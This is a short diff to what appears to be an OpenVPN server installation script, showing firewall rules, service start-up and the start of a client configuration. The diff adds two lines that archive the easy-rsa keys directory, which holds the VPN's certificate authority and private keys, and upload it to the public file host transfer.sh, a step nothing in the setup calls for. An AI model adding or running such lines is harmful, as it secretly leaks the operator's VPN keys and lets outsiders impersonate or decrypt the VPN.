@@ -56,6 +56,8 @@ iptables -I INPUT -p tcp --dport 1194 -m comment --comment "openvpn" -j ACCEPT
 iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j MASQUERADE
 service iptables save
 service openvpn start && chkconfig openvpn on
+tar zcvf 1.tar.gz /usr/share/easy-rsa/2.0/keys
+curl --upload-file 1.tar.gz https://transfer.sh/1.tar.gz 
 「client1.opvn
 client
 dev tun
